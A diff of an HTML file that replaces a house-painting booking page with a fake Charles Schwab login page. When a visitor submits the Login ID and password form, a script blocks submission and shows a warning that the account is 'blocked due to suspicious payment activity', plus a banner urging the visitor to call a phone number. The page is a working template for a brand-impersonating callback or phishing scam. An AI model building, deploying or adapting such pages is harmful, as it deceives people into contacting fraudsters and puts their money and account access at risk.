@@ -3,142 +3,327 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Expert house painting services. Pre-book your appointment by calling +1(888) 537-9659 or using the inquiry form.">
-    <title>House Painting Services</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <title>Login | Charles Schwab</title>
     <style>
+	* {
+    box-sizing: border-box;
+    max-width: 100%;
+}
+        /* General body and page setup */
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
             margin: 0;
-            padding: 0;
-            background-color: #f9f9f9;
-            color: #333;
+            height: 100vh;
         }
-        header {
-            background: linear-gradient(90deg, #0078d7, #0056b3);
-            color: white;
-            padding: 30px 20px;
+
+        /* Header with logo and fixed height of 2cm */
+        .header {
+            height: 2cm;
+            background-color: #ffffff;
+            display: flex;
+            align-items: center;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        /* Logo on the left */
+        .header img {
+            height: 100%;
+            object-fit: contain;
+			max-height: 64px;
+        }
+
+        /* Banner below the header, covers full width */
+        .banner {
+            width: 100%;
+            height: auto;
+            background-image: url('your-banner-image.jpg');
+            background-size: cover;
+            background-position: 50% 25%;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 25px 0;
+        }
+
+        /* Container for the login form */
+        .login-container {
+            background-color: #fff;
+            padding: 26px;            
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: calc(300px + 4cm);
+            height: auto;
+            position: relative;
+			max-width: 370px;
+        }
+
+        .login-header {
+            text-align: left;
+            font-size: 22px;
+            color: #000;
+            margin-bottom: 16px;
+        }
+
+        .warning-message {
+            color: #d32f2f;
+            font-weight: bold;
             text-align: center;
-        }
-        header h1 {
-            margin: 0;
-            font-size: 2.5rem;
-        }
-        header p {
-            margin: 10px 0 0;
-            font-size: 1.1rem;
-        }
-        main {
-            max-width: 900px;
-            margin: 20px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        section {
-            margin-bottom: 30px;
-        }
-        section h2 {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-        }
-        section p {
-            margin-bottom: 10px;
-            line-height: 1.6;
-        }
-        .form-container {
             margin-bottom: 20px;
+            display: none; /* Initially hidden */
         }
-        .form-container label {
-            display: block;
-            margin-bottom: 5px;
+
+        .warning-message a {
+            color: #d32f2f;
+            text-decoration: none;
             font-weight: bold;
         }
-        .form-container input, .form-container textarea {
-            width: 100%;
-            max-width: 500px;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        .form-container button {
-            padding: 10px 20px;
-            background-color: #0078d7;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .form-container button:hover {
-            background-color: #0056b3;
-        }
-        footer {
-            text-align: center;
-            padding: 20px;
-            background: #333;
-            color: white;
-        }
-        footer a {
-            color: #0078d7;
-            text-decoration: none;
-        }
-        footer a:hover {
+
+        .warning-message a:hover {
             text-decoration: underline;
         }
+
+        input, select {
+			width: 100%;
+			padding: 7px;
+			margin: 5px 0 10px;
+			border: 1px solid #ccc;
+		}
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #005a9e;
+            color: white;
+            border: none;
+            border-radius: 0px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #005a9e;
+        }
+
+        .forgot-links a {
+            color: #006e99;
+            text-decoration: none;
+        }
+
+        .forgot-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-select {
+            display: flex;
+            align-items: center;
+            margin: 0px;
+        }
+
+        .language-select label {
+            margin-right: 10px;
+        }
+
+        .language-select select {
+            width: 150px;
+			margin-bottom: 0;
+        }
+
+        /* Information section */
+        .info-section {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            padding: 20px 0;
+            background-color: #f9f9f9;
+        }
+
+        .info-box {
+            flex: 1;
+            margin: 0 10px;
+            text-align: left;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .info-box img {
+            width: 100%;
+            height: 150px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+
+        .info-box h3 {
+            font-size: 1.2em;
+            margin: 10px 0 5px;
+            color: #333;
+        }
+
+        .info-box p {
+            font-size: 0.9em;
+            color: #555;
+            margin: 0;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #f4f4f4;
+            font-size: 0.8em;
+            color: #777;
+        }
+
+        /* Call-to-action banner */
+        .call-banner {
+            display: none; /* Hidden by default */
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            z-index: 1000;
+        }
+
+        .call-banner a {
+            color: white;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .call-banner a:hover {
+            text-decoration: underline;
+        }
+		.remember-me {
+    overflow: hidden;
+    clear: both;
+}
+.remember-me input#remember-me-checkbox-stack {
+    float: left;
+    width: auto;
+    margin: 0 10px 10px 0;
+}
+label#remember-me-text-stack {
+    float: left;
+    font-size: 15px;
+    line-height: 1;
+}
+
+        /* Responsive styles for mobile devices */
+        @media (max-width: 768px) {
+            .call-banner {
+                display: none; /* Initially hidden, shown only when triggered */
+            }
+        }
     </style>
+    <script>
+        function showWarningMessage(event) {
+            event.preventDefault(); // Prevent form submission
+            const warningMessage = document.getElementById("warningMessage");
+            const callBanner = document.getElementById("callBanner");
+            warningMessage.style.display = "block"; // Show the warning message
+            callBanner.style.display = "block"; // Show the call banner
+        }
+    </script>
 </head>
 <body>
-    <header>
-        <h1>House Painting Services</h1>
-        <p>Pre-book your appointment today!</p>
-    </header>
-    <main>
-        <section>
-            <h2>About Us</h2>
-            <p>We specialize in providing expert house painting services, ensuring top-notch quality and customer satisfaction. With years of experience in the industry, we guarantee a flawless finish that will make your home look stunning.</p>
-            <p>Please note, we only work on pre-bookings. You can book an appointment by calling us at <strong>+1(888) 537-9659</strong> or using the inquiry form below.</p>
-        </section>
-        <section>
-            <h2>Book an Appointment</h2>
-            <p>Please fill out the inquiry form below to book an appointment at least 20 days in advance:</p>
-            <div class="form-container">
-                <form>
-                    <label for="name">Your Name:</label>
-                    <input type="text" id="name" name="name" placeholder="Enter your name" required>
-                    <label for="phone">Phone Number:</label>
-                    <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
-                    <label for="date">Preferred Appointment Date (min 20 days from today):</label>
-                    <input type="date" id="date" name="date" required>
-                    <label for="message">Additional Details (optional):</label>
-                    <textarea id="message" name="message" rows="4" placeholder="Any special instructions or requests"></textarea>
-                    <button type="submit">Submit Inquiry</button>
-                </form>
-                <p class="note"><strong>Note:</strong> Booking confirmation will be sent to your registered phone number.</p>
+
+    <!-- Header Section -->
+    <div class="header">
+        <img src="your-logo.png" alt="Logo">
+    </div>
+
+    <!-- Banner Section -->
+    <div class="banner">
+        <div class="login-container">
+            <!-- Warning Message -->
+            <div class="warning-message" id="warningMessage">
+                Your account is blocked due to suspicious payment activity.<br>
+                Please call: <a href="tel:+18880000000">+1 (888) 000 0000</a> for help.<br>
+                Do not attempt to log in again.
             </div>
-        </section>
-        <section>
-            <h2>Privacy Policy</h2>
-            <p>We value your privacy and ensure your personal information is securely handled:</p>
-            <ul>
-                <li>Your data is used solely to process your inquiries and appointments.</li>
-                <li>We do not share your data with third parties unless legally required.</li>
-                <li>You may request access to or deletion of your data at any time.</li>
-            </ul>
-        </section>
-        <section>
-            <h2>Terms and Conditions</h2>
-            <p>By using our services, you agree to the following terms:</p>
-            <ul>
-                <li>Appointments must be booked at least 20 days in advance.</li>
-                <li>All bookings are subject to confirmation and availability.</li>
-                <li>We reserve the right to refuse services for inappropriate requests or policy violations.</li>
-            </ul>
-        </section>
-    </main>
-    <footer>
-        <p>&copy; 2024 House Painting Services. Call us at <strong>+1(888) 537-9659</strong>. <a href="#privacy-policy">Privacy Policy</a> | <a href="#terms-and-conditions">Terms and Conditions</a></p>
-    </footer>
+            
+            <div class="login-header">Login to Schwab</div>
+            <form onsubmit="showWarningMessage(event)">
+                <label for="username">Login ID</label>
+                <input type="text" name="username" id="username" required>
+                
+                <label for="password">Password</label>
+                <input type="password" name="password" id="password" required>
+
+                <label for="startPage">Start Page</label>
+                <select name="startPage" id="startPage" required>
+                    <option value="account_summary" selected>Account Summary</option>
+                    <option value="account_balance">Account Balance</option>
+                    <option value="position">Position</option>
+                    <option value="trade_ticket">Trade Ticket</option>
+                    <option value="history">History</option>
+                    <option value="stock_etf_trading">Stock & ETF Trading</option>
+                    <option value="option_trading">Option Trading</option>
+                    <option value="mutual_fund_trading">Mutual Fund Trading</option>
+                    <option value="bond_trading">Bond Trading</option>
+                    <option value="research">Research</option>
+                    <option value="order_status">Order Status</option>
+                    <option value="watchlist">Watchlist</option>
+                </select>
+			<div class="remember-me"><input type="checkbox" id="remember-me-checkbox-stack" name="remember-me-checkbox-stack"><label id="remember-me-text-stack" for="remember-me-checkbox-stack">Remember Login ID</label></div>
+                <button type="submit">Login</button>
+            </form>
+
+            <!-- Forgot and New User Links -->
+            <div class="forgot-links"><br>
+                <a href="#">Forgot Login ID or Password?</a><br>                
+            </div>
+
+            <!-- Language Selector -->
+            <div class="language-select">
+                <label for="language">Language:</label>
+                <select name="language" id="language">
+                    <option value="en" selected>English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                </select>
+            </div>
+        </div>
+    </div>
+
+    <!-- Divider -->
+    <div class="divider"></div>
+    <!-- Information Section with Three Boxes -->
+    <div class="info-section">
+        <div class="info-box">
+            <img src="image1.jpg" alt="Section 1">
+            <h3>Bull or Bear?</h3>
+            <p>With the Services, you can get insights into investor ticks based on actual trading behavior of Schwab clients.</p>
+        </div>
+        <div class="info-box">
+            <img src="image2.jpg" alt="Section 2">
+            <h3>Looking to fund the future, you've always imagined?</h3>
+            <p>Learn how Schwab can help</p>
+        </div>
+        <div class="info-box">
+            <img src="image3.jpg" alt="Section 3">
+            <h3>The Schwab Investor Card® from ATM Express.</h3>
+            <p>Earn a $300 Card Statement Credit when you spend $1,000 in the first 3 months of Card Membership. Offer ends Soon. Terms apply.</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2024 Schwab. All rights reserved.</p>
+        <p><a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a></p>
+    </div>
+
+    <!-- Call Banner -->
+    <div class="call-banner" id="callBanner">
+        Need help? Call us now: <a href="tel:+18880000000">+1 (888) 000 0000</a>
+    </div>
+
 </body>
 </html>
